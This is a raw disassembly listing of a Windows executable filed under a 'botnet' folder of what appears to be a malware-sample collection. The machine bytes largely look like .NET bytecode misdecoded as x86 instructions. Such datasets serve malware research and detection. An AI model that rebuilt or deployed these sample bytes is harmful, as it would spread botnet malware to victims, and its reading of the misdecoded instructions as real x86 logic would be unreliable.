
malware_samples/botnet/c8c4f2f6c86ebf60afc9073fc0bdee91a1376097f824d25cfb5bfb9eabcce17b.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	80 c9 00             	or     $0x0,%cl
  402003:	00 00                	add    %al,(%eax)
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 f4 59 00       	add    $0x59f400,%eax
  402013:	00 58 6f             	add    %bl,0x6f(%eax)
  402016:	00 00                	add    %al,(%eax)
  402018:	03 00                	add    (%eax),%eax
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	18 00                	sbb    %al,(%eax)
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 13                	jle    0x402096
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 14                	jle    0x4020a6
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 15                	jle    0x4020b6
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 16                	jle    0x4020c6
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 17                	jle    0x4020d6
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 18                	jle    0x4020e6
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 19                	jle    0x4020f6
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 1a                	jle    0x402106
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1c                	jle    0x40211e
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  40210d:	2a 1a                	sub    (%edx),%bl
  40210f:	7e 1d                	jle    0x40212e
  402111:	00 00                	add    %al,(%eax)
  402113:	04 2a                	add    $0x2a,%al
  402115:	1e                   	push   %ds
  402116:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  40211c:	2a 2a                	sub    (%edx),%ch
  40211e:	02 28                	add    (%eax),%ch
  402120:	3e 00 00             	add    %al,%ds:(%eax)
  402123:	0a 16                	or     (%esi),%dl
  402125:	fe 03                	incb   (%ebx)
  402127:	2a 32                	sub    (%edx),%dh
  402129:	7e 0b                	jle    0x402136
  40212b:	00 00                	add    %al,(%eax)
  40212d:	04 03                	add    $0x3,%al
  40212f:	6f                   	outsl  %ds:(%esi),(%dx)
  402130:	3f                   	aas
  402131:	00 00                	add    %al,(%eax)
  402133:	0a 2a                	or     (%edx),%ch
  402135:	2e 73 18             	jae,pn 0x402150
  402138:	00 00                	add    %al,(%eax)
  40213a:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402140:	2a e6                	sub    %dh,%ah
  402142:	28 29                	sub    %ch,(%ecx)
  402144:	00 00                	add    %al,(%eax)
  402146:	06                   	push   %es
  402147:	3a 28                	cmp    (%eax),%ch
  402149:	00 00                	add    %al,(%eax)
  40214b:	00 28                	add    %ch,(%eax)
  40214d:	2a 00                	sub    (%eax),%al
  40214f:	00 06                	add    %al,(%esi)
  402151:	3a 1e                	cmp    (%esi),%bl
  402153:	00 00                	add    %al,(%eax)
  402155:	00 28                	add    %ch,(%eax)
  402157:	2b 00                	sub    (%eax),%eax
  402159:	00 06                	add    %al,(%esi)
  40215b:	3a 14 00             	cmp    (%eax,%eax,1),%dl
  40215e:	00 00                	add    %al,(%eax)
  402160:	28 27                	sub    %ah,(%edi)
  402162:	00 00                	add    %al,(%eax)
  402164:	06                   	push   %es
  402165:	3a 0a                	cmp    (%edx),%cl
  402167:	00 00                	add    %al,(%eax)
  402169:	00 28                	add    %ch,(%eax)
  40216b:	28 00                	sub    %al,(%eax)
  40216d:	00 06                	add    %al,(%esi)
  40216f:	39 06                	cmp    %eax,(%esi)
  402171:	00 00                	add    %al,(%eax)
  402173:	00 14 28             	add    %dl,(%eax,%ebp,1)
  402176:	76 00                	jbe    0x402178
  402178:	00 0a                	add    %cl,(%edx)
  40217a:	2a 56 28             	sub    0x28(%esi),%dl
  40217d:	9c                   	pushf
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 73 9d             	or     -0x63(%ebx),%dh
  402183:	00 00                	add    %al,(%eax)
  402185:	0a 20                	or     (%eax),%ah
  402187:	20 02                	and    %al,(%edx)
  402189:	00 00                	add    %al,(%eax)
  40218b:	6f                   	outsl  %ds:(%esi),(%dx)
  40218c:	9e                   	sahf
  40218d:	00 00                	add    %al,(%eax)
  40218f:	0a 2a                	or     (%edx),%ch
  402191:	6e                   	outsb  %ds:(%esi),(%dx)
  402192:	7e 1e                	jle    0x4021b2
  402194:	00 00                	add    %al,(%eax)
  402196:	04 39                	add    $0x39,%al
  402198:	10 00                	adc    %al,(%eax)
  40219a:	00 00                	add    %al,(%eax)
  40219c:	7e 1e                	jle    0x4021bc
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	04 6f                	add    $0x6f,%al
  4021a2:	ad                   	lods   %ds:(%esi),%eax
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 14 80             	or     (%eax,%eax,4),%dl
  4021a8:	1e                   	push   %ds
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	04 2a                	add    $0x2a,%al
  4021ad:	7e 7e                	jle    0x40222d
  4021af:	0f 00 00             	sldt   (%eax)
  4021b2:	04 28                	add    $0x28,%al
  4021b4:	17                   	pop    %ss
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	0a 39                	or     (%ecx),%bh
  4021b9:	0f 00 00             	sldt   (%eax)
  4021bc:	00 28                	add    %ch,(%eax)
  4021be:	30 00                	xor    %al,(%eax)
  4021c0:	00 06                	add    %al,(%esi)
  4021c2:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  4021c8:	40                   	inc    %eax
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	06                   	push   %es
  4021cc:	2a 56 72             	sub    0x72(%esi),%dl
  4021cf:	f0 27                	lock daa
  4021d1:	00 70 7e             	add    %dh,0x7e(%eax)
  4021d4:	10 00                	adc    %al,(%eax)
  4021d6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	0a 80 23 00 00 04    	or     0x4000023(%eax),%al
  4021e2:	2a be 73 94 00 00    	sub    0x9473(%esi),%bh
  4021e8:	06                   	push   %es
  4021e9:	25 72 a4 23 00       	and    $0x23a472,%eax
  4021ee:	70 6f                	jo     0x40225f
  4021f0:	7f 00                	jg     0x4021f2
  4021f2:	00 06                	add    %al,(%esi)
  4021f4:	72 9c                	jb     0x402192
  4021f6:	28 00                	sub    %al,(%eax)
  4021f8:	70 6f                	jo     0x402269
  4021fa:	8c 00                	mov    %es,(%eax)
  4021fc:	00 06                	add    %al,(%esi)
  4021fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ff:	89 00                	mov    %eax,(%eax)
  402201:	00 06                	add    %al,(%esi)
  402203:	28 20                	sub    %ah,(%eax)
  402205:	00 00                	add    %al,(%eax)
  402207:	06                   	push   %es
  402208:	20 e8                	and    %ch,%al
  40220a:	03 00                	add    (%eax),%eax
  40220c:	00 28                	add    %ch,(%eax)
  40220e:	14 00                	adc    $0x0,%al
  402210:	00 0a                	add    %cl,(%edx)
  402212:	2a da                	sub    %dl,%bl
  402214:	73 94                	jae    0x4021aa
  402216:	00 00                	add    %al,(%eax)
  402218:	06                   	push   %es
  402219:	25 72 a4 23 00       	and    $0x23a472,%eax
  40221e:	70 6f                	jo     0x40228f
  402220:	7f 00                	jg     0x402222
  402222:	00 06                	add    %al,(%esi)
  402224:	72 ae                	jb     0x4021d4
  402226:	28 00                	sub    %al,(%eax)
  402228:	70 6f                	jo     0x402299
  40222a:	8c 00                	mov    %es,(%eax)
  40222c:	00 06                	add    %al,(%esi)
  40222e:	25 72 ae 28 00       	and    $0x28ae72,%eax
  402233:	70 6f                	jo     0x4022a4
  402235:	7f 00                	jg     0x402237
  402237:	00 06                	add    %al,(%esi)
  402239:	02 6f 8c             	add    -0x74(%edi),%ch
  40223c:	00 00                	add    %al,(%eax)
  40223e:	06                   	push   %es
  40223f:	6f                   	outsl  %ds:(%esi),(%dx)
  402240:	89 00                	mov    %eax,(%eax)
  402242:	00 06                	add    %al,(%esi)
  402244:	28 20                	sub    %ah,(%eax)
  402246:	00 00                	add    %al,(%eax)
  402248:	06                   	push   %es
  402249:	2a 2e                	sub    (%esi),%ch
  40224b:	73 c9                	jae    0x402216
  40224d:	00 00                	add    %al,(%eax)
  40224f:	0a 80 24 00 00 04    	or     0x4000024(%eax),%al
  402255:	2a 5e 02             	sub    0x2(%esi),%bl
  402258:	28 19                	sub    %bl,(%ecx)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0a 03                	or     (%ebx),%al
  40225e:	6f                   	outsl  %ds:(%esi),(%dx)
  40225f:	1f                   	pop    %ds
  402260:	00 00                	add    %al,(%eax)
  402262:	0a 28                	or     (%eax),%ch
  402264:	4d                   	dec    %ebp
  402265:	00 00                	add    %al,(%eax)
  402267:	06                   	push   %es
  402268:	28 ce                	sub    %cl,%dh
  40226a:	00 00                	add    %al,(%eax)
  40226c:	0a 2a                	or     (%edx),%ch
  40226e:	5e                   	pop    %esi
  40226f:	28 19                	sub    %bl,(%ecx)
  402271:	00 00                	add    %al,(%eax)
  402273:	0a 02                	or     (%edx),%al
  402275:	03 28                	add    (%eax),%ebp
  402277:	1a 00                	sbb    (%eax),%al
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	28 4f 00             	sub    %cl,0x0(%edi)
  40227e:	00 06                	add    %al,(%esi)
  402280:	6f                   	outsl  %ds:(%esi),(%dx)
  402281:	1b 00                	sbb    (%eax),%eax
  402283:	00 0a                	add    %cl,(%edx)
  402285:	2a 62 1f             	sub    0x1f(%edx),%ah
  402288:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40228e:	25 d0 2d 00 00       	and    $0x2dd0,%eax
  402293:	04 28                	add    $0x28,%al
  402295:	e4 00                	in     $0x0,%al
  402297:	00 0a                	add    %cl,(%edx)
  402299:	80 2c 00 00          	subb   $0x0,(%eax,%eax,1)
  40229d:	04 2a                	add    $0x2a,%al
  40229f:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	04 02                	add    $0x2,%al
  4022a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a7:	1f                   	pop    %ds
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	0a 2a                	or     (%edx),%ch
  4022ac:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	04 02                	add    $0x2,%al
  4022b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b4:	1b 00                	sbb    (%eax),%eax
  4022b6:	00 0a                	add    %cl,(%edx)
  4022b8:	2a 32                	sub    (%edx),%dh
  4022ba:	02 28                	add    (%eax),%ch
  4022bc:	e7 00                	out    %eax,$0x0
  4022be:	00 0a                	add    %cl,(%edx)
  4022c0:	28 58 00             	sub    %bl,0x0(%eax)
  4022c3:	00 06                	add    %al,(%esi)
  4022c5:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  4022cb:	00 01                	add    %al,(%ecx)
  4022cd:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  4022d2:	25 18 02 1e 63       	and    $0x631e0218,%eax
  4022d7:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  4022de:	63 d2                	arpl   %edx,%edx
  4022e0:	9c                   	pushf
  4022e1:	25 16 02 1f 18       	and    $0x181f0216,%eax
  4022e6:	63 d2                	arpl   %edx,%edx
  4022e8:	9c                   	pushf
  4022e9:	2a 4e 18             	sub    0x18(%esi),%cl
  4022ec:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4022f0:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  4022f6:	25 16 02 1e 63       	and    $0x631e0216,%eax
  4022fb:	d2 9c 2a 32 02 28 e8 	rcrb   %cl,-0x17d7fdce(%edx,%ebp,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	0a 28                	or     (%eax),%ch
  402306:	58                   	pop    %eax
  402307:	00 00                	add    %al,(%eax)
  402309:	06                   	push   %es
  40230a:	2a 2e                	sub    (%esi),%ch
  40230c:	73 e9                	jae    0x4022f7
  40230e:	00 00                	add    %al,(%eax)
  402310:	0a 80 2e 00 00 04    	or     0x400002e(%eax),%al
  402316:	2a 56 02             	sub    0x2(%esi),%dl
  402319:	15 7d 30 00 00       	adc    $0x307d,%eax
  40231e:	04 02                	add    $0x2,%al
  402320:	28 18                	sub    %bl,(%eax)
  402322:	00 00                	add    %al,(%eax)
  402324:	0a 02                	or     (%edx),%al
  402326:	03 7d 2f             	add    0x2f(%ebp),%edi
  402329:	00 00                	add    %al,(%eax)
  40232b:	04 2a                	add    $0x2a,%al
  40232d:	4a                   	dec    %edx
  40232e:	02 7b 2f             	add    0x2f(%ebx),%bh
  402331:	00 00                	add    %al,(%eax)
  402333:	04 02                	add    $0x2,%al
  402335:	7b 30                	jnp    0x402367
  402337:	00 00                	add    %al,(%eax)
  402339:	04 6f                	add    $0x6f,%al
  40233b:	ea 00 00 0a 2a 8a 02 	ljmp   $0x28a,$0x2a0a0000
  402342:	02 7b 30             	add    0x30(%ebx),%bh
  402345:	00 00                	add    %al,(%eax)
  402347:	04 17                	add    $0x17,%al
  402349:	58                   	pop    %eax
  40234a:	7d 30                	jge    0x40237c
  40234c:	00 00                	add    %al,(%eax)
  40234e:	04 02                	add    $0x2,%al
  402350:	7b 30                	jnp    0x402382
  402352:	00 00                	add    %al,(%eax)
  402354:	04 02                	add    $0x2,%al
  402356:	7b 2f                	jnp    0x402387
  402358:	00 00                	add    %al,(%eax)
  40235a:	04 6f                	add    $0x6f,%al
  40235c:	eb 00                	jmp    0x40235e
  40235e:	00 0a                	add    %cl,(%edx)
  402360:	fe 04 2a             	incb   (%edx,%ebp,1)
  402363:	22 02                	and    (%edx),%al
  402365:	15 7d 30 00 00       	adc    $0x307d,%eax
  40236a:	04 2a                	add    $0x2a,%al
  40236c:	56                   	push   %esi
  40236d:	02 28                	add    (%eax),%ch
  40236f:	18 00                	sbb    %al,(%eax)
  402371:	00 0a                	add    %cl,(%edx)
  402373:	02 03                	add    (%ebx),%al
  402375:	7d 32                	jge    0x4023a9
  402377:	00 00                	add    %al,(%eax)
  402379:	04 02                	add    $0x2,%al
  40237b:	04 7d                	add    $0x7d,%al
  40237d:	31 00                	xor    %eax,(%eax)
  40237f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402382:	32 02                	xor    (%edx),%al
  402384:	7b 32                	jnp    0x4023b8
  402386:	00 00                	add    %al,(%eax)
  402388:	04 6f                	add    $0x6f,%al
  40238a:	71 00                	jno    0x40238c
  40238c:	00 06                	add    %al,(%esi)
  40238e:	2a 4e 02             	sub    0x2(%esi),%cl
  402391:	7b 32                	jnp    0x4023c5
  402393:	00 00                	add    %al,(%eax)
  402395:	04 6f                	add    $0x6f,%al
  402397:	71 00                	jno    0x402399
  402399:	00 06                	add    %al,(%esi)
  40239b:	25 03 6f 8c 00       	and    $0x8c6f03,%eax
  4023a0:	00 06                	add    %al,(%esi)
  4023a2:	2a 4e 02             	sub    0x2(%esi),%cl
  4023a5:	7b 32                	jnp    0x4023d9
  4023a7:	00 00                	add    %al,(%eax)
  4023a9:	04 6f                	add    $0x6f,%al
  4023ab:	71 00                	jno    0x4023ad
  4023ad:	00 06                	add    %al,(%esi)
  4023af:	25 03 6f 74 00       	and    $0x746f03,%eax
  4023b4:	00 06                	add    %al,(%esi)
  4023b6:	2a 4e 02             	sub    0x2(%esi),%cl
  4023b9:	7b 32                	jnp    0x4023ed
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	04 6f                	add    $0x6f,%al
  4023bf:	71 00                	jno    0x4023c1
  4023c1:	00 06                	add    %al,(%esi)
  4023c3:	25 03 6f 85 00       	and    $0x856f03,%eax
  4023c8:	00 06                	add    %al,(%esi)
  4023ca:	2a 36                	sub    (%esi),%dh
  4023cc:	02 7b 31             	add    0x31(%ebx),%bh
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	04 03                	add    $0x3,%al
  4023d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d4:	ea 00 00 0a 2a 32 02 	ljmp   $0x232,$0x2a0a0000
  4023db:	7b 31                	jnp    0x40240e
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	04 6f                	add    $0x6f,%al
  4023e1:	eb 00                	jmp    0x4023e3
  4023e3:	00 0a                	add    %cl,(%edx)
  4023e5:	2a 66 02             	sub    0x2(%esi),%ah
  4023e8:	03 7d 33             	add    0x33(%ebp),%edi
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	04 02                	add    $0x2,%al
  4023ef:	02 7b 33             	add    0x33(%ebx),%bh
  4023f2:	00 00                	add    %al,(%eax)
  4023f4:	04 6f                	add    $0x6f,%al
  4023f6:	7d 00                	jge    0x4023f8
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	7d 34                	jge    0x402430
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	04 2a                	add    $0x2a,%al
  402400:	82 02 7b             	addb   $0x7b,(%edx)
  402403:	36 00 00             	add    %al,%ss:(%eax)
  402406:	04 18                	add    $0x18,%al
  402408:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40240e:	28 6b 00             	sub    %ch,0x0(%ebx)
  402411:	00 06                	add    %al,(%esi)
  402413:	02 18                	add    (%eax),%bl
  402415:	7d 36                	jge    0x40244d
  402417:	00 00                	add    %al,(%eax)
  402419:	04 02                	add    $0x2,%al
  40241b:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40241f:	06                   	push   %es
  402420:	2a 82 02 7b 36 00    	sub    0x367b02(%edx),%al
  402426:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402429:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40242f:	28 6b 00             	sub    %ch,0x0(%ebx)
  402432:	00 06                	add    %al,(%esi)
  402434:	02 19                	add    (%ecx),%bl
  402436:	7d 36                	jge    0x40246e
  402438:	00 00                	add    %al,(%eax)
  40243a:	04 02                	add    $0x2,%al
  40243c:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402440:	06                   	push   %es
  402441:	2a 1e                	sub    (%esi),%bl
  402443:	02 28                	add    (%eax),%ch
  402445:	70 00                	jo     0x402447
  402447:	00 06                	add    %al,(%esi)
  402449:	2a 52 02             	sub    0x2(%edx),%dl
  40244c:	03 8c 68 00 00 01 7d 	add    0x7d010000(%eax,%ebp,2),%ecx
  402453:	35 00 00 04 02       	xor    $0x2040000,%eax
  402458:	1b 7d 36             	sbb    0x36(%ebp),%edi
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 2a                	add    $0x2a,%al
  40245f:	52                   	push   %edx
  402460:	02 03                	add    (%ebx),%al
  402462:	8c 95 00 00 01 7d    	mov    %ss,0x7d010000(%ebp)
  402468:	35 00 00 04 02       	xor    $0x2040000,%eax
  40246d:	1c 7d                	sbb    $0x7d,%al
  40246f:	36 00 00             	add    %al,%ss:(%eax)
  402472:	04 2a                	add    $0x2a,%al
  402474:	42                   	inc    %edx
  402475:	02 03                	add    (%ebx),%al
  402477:	7d 35                	jge    0x4024ae
  402479:	00 00                	add    %al,(%eax)
  40247b:	04 02                	add    $0x2,%al
  40247d:	1f                   	pop    %ds
  40247e:	0b 7d 36             	or     0x36(%ebp),%edi
  402481:	00 00                	add    %al,(%eax)
  402483:	04 2a                	add    $0x2a,%al
  402485:	52                   	push   %edx
  402486:	02 28                	add    (%eax),%ch
  402488:	70 00                	jo     0x40248a
  40248a:	00 06                	add    %al,(%esi)
  40248c:	25 03 7d 33 00       	and    $0x337d03,%eax
  402491:	00 04 04             	add    %al,(%esp,%eax,1)
  402494:	6f                   	outsl  %ds:(%esi),(%dx)
  402495:	81 00 00 06 2a 56    	addl   $0x562a0600,(%eax)
  40249b:	02 28                	add    (%eax),%ch
  40249d:	70 00                	jo     0x40249f
  40249f:	00 06                	add    %al,(%esi)
  4024a1:	25 03 7d 33 00       	and    $0x337d03,%eax
  4024a6:	00 04 04             	add    %al,(%esp,%eax,1)
  4024a9:	6a 6f                	push   $0x6f
  4024ab:	74 00                	je     0x4024ad
  4024ad:	00 06                	add    %al,(%esi)
  4024af:	2a 56 02             	sub    0x2(%esi),%dl
  4024b2:	28 6b 00             	sub    %ch,0x0(%ebx)
  4024b5:	00 06                	add    %al,(%esi)
  4024b7:	02 14 7d 35 00 00 04 	add    0x4000035(,%edi,2),%dl
  4024be:	02 17                	add    (%edi),%dl
  4024c0:	7d 36                	jge    0x4024f8
  4024c2:	00 00                	add    %al,(%eax)
  4024c4:	04 2a                	add    $0x2a,%al
  4024c6:	3e 02 03             	add    %ds:(%ebx),%al
  4024c9:	7d 35                	jge    0x402500
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	04 02                	add    $0x2,%al
  4024cf:	1a 7d 36             	sbb    0x36(%ebp),%bh
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	04 2a                	add    $0x2a,%al
  4024d6:	76 02                	jbe    0x4024da
  4024d8:	7b 35                	jnp    0x40250f
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	04 3a                	add    $0x3a,%al
  4024de:	06                   	push   %es
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	00 72 9e             	add    %dh,-0x62(%edx)
  4024e4:	23 00                	and    (%eax),%eax
  4024e6:	70 2a                	jo     0x402512
  4024e8:	02 7b 35             	add    0x35(%ebx),%bh
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	04 6f                	add    $0x6f,%al
  4024ef:	38 00                	cmp    %al,(%eax)
  4024f1:	00 0a                	add    %cl,(%edx)
  4024f3:	2a 52 02             	sub    0x2(%edx),%dl
  4024f6:	1d 7d 36 00 00       	sbb    $0x367d,%eax
  4024fb:	04 02                	add    $0x2,%al
  4024fd:	03 8c 6c 00 00 01 7d 	add    0x7d010000(%esp,%ebp,2),%ecx
  402504:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402509:	56                   	push   %esi
  40250a:	02 1f                	add    (%edi),%bl
  40250c:	09 7d 36             	or     %edi,0x36(%ebp)
  40250f:	00 00                	add    %al,(%eax)
  402511:	04 02                	add    $0x2,%al
  402513:	03 8c 97 00 00 01 7d 	add    0x7d010000(%edi,%edx,4),%ecx
  40251a:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  40251f:	52                   	push   %edx
  402520:	02 1e                	add    (%esi),%bl
  402522:	7d 36                	jge    0x40255a
  402524:	00 00                	add    %al,(%eax)
  402526:	04 02                	add    $0x2,%al
  402528:	03 8c 96 00 00 01 7d 	add    0x7d010000(%esi,%edx,4),%ecx
  40252f:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402534:	1e                   	push   %ds
  402535:	02 28                	add    (%eax),%ch
  402537:	82 00 00             	addb   $0x0,(%eax)
  40253a:	06                   	push   %es
  40253b:	2a 22                	sub    (%edx),%ah
  40253d:	02 03                	add    (%ebx),%al
  40253f:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  402545:	1e                   	push   %ds
  402546:	02 28                	add    (%eax),%ch
  402548:	77 00                	ja     0x40254a
  40254a:	00 06                	add    %al,(%esi)
  40254c:	2a 22                	sub    (%edx),%ah
  40254e:	02 03                	add    (%ebx),%al
  402550:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  402554:	06                   	push   %es
  402555:	2a 1e                	sub    (%esi),%bl
  402557:	02 28                	add    (%eax),%ch
  402559:	78 00                	js     0x40255b
  40255b:	00 06                	add    %al,(%esi)
  40255d:	2a 22                	sub    (%edx),%ah
  40255f:	02 03                	add    (%ebx),%al
  402561:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  402567:	1e                   	push   %ds
  402568:	02 7b 36             	add    0x36(%ebx),%bh
  40256b:	00 00                	add    %al,(%eax)
  40256d:	04 2a                	add    $0x2a,%al
  40256f:	32 02                	xor    (%edx),%al
  402571:	7b 38                	jnp    0x4025ab
  402573:	00 00                	add    %al,(%eax)
  402575:	04 73                	add    $0x73,%al
  402577:	5f                   	pop    %edi
  402578:	00 00                	add    %al,(%eax)
  40257a:	06                   	push   %es
  40257b:	2a 4a 02             	sub    0x2(%edx),%cl
  40257e:	73 c9                	jae    0x402549
  402580:	00 00                	add    %al,(%eax)
  402582:	0a 7d 38             	or     0x38(%ebp),%bh
  402585:	00 00                	add    %al,(%eax)
  402587:	04 02                	add    $0x2,%al
  402589:	28 18                	sub    %bl,(%eax)
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 2a                	or     (%edx),%ch
  40258f:	3a 02                	cmp    (%edx),%al
  402591:	6f                   	outsl  %ds:(%esi),(%dx)
  402592:	00 01                	add    %al,(%ecx)
  402594:	00 0a                	add    %cl,(%edx)
  402596:	d2 02                	rolb   %cl,(%edx)
  402598:	28 97 00 00 06 2a    	sub    %dl,0x2a060000(%edi)
  40259e:	32 02                	xor    (%edx),%al
  4025a0:	20 c0                	and    %al,%al
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	00 6f ee             	add    %ch,-0x12(%edi)
  4025a7:	00 00                	add    %al,(%eax)
  4025a9:	0a 2a                	or     (%edx),%ch
  4025ab:	6a 02                	push   $0x2
  4025ad:	20 cb                	and    %cl,%bl
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	00 6f ee             	add    %ch,-0x12(%edi)
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	0a 02                	or     (%edx),%al
  4025b8:	03 28                	add    (%eax),%ebp
  4025ba:	5c                   	pop    %esp
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	16                   	push   %ss
  4025bf:	1e                   	push   %ds
  4025c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025c1:	4c                   	dec    %esp
  4025c2:	00 00                	add    %al,(%eax)
  4025c4:	0a 2a                	or     (%edx),%ch
  4025c6:	7e 02                	jle    0x4025ca
  4025c8:	20 ca                	and    %cl,%dl
  4025ca:	00 00                	add    %al,(%eax)
  4025cc:	00 6f ee             	add    %ch,-0x12(%edi)
  4025cf:	00 00                	add    %al,(%eax)
  4025d1:	0a 02                	or     (%edx),%al
  4025d3:	03 28                	add    (%eax),%ebp
  4025d5:	fd                   	std
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	0a 28                	or     (%eax),%ch
  4025da:	58                   	pop    %eax
  4025db:	00 00                	add    %al,(%eax)
  4025dd:	06                   	push   %es
  4025de:	16                   	push   %ss
  4025df:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4025e2:	00 00                	add    %al,(%eax)
  4025e4:	0a 2a                	or     (%edx),%ch
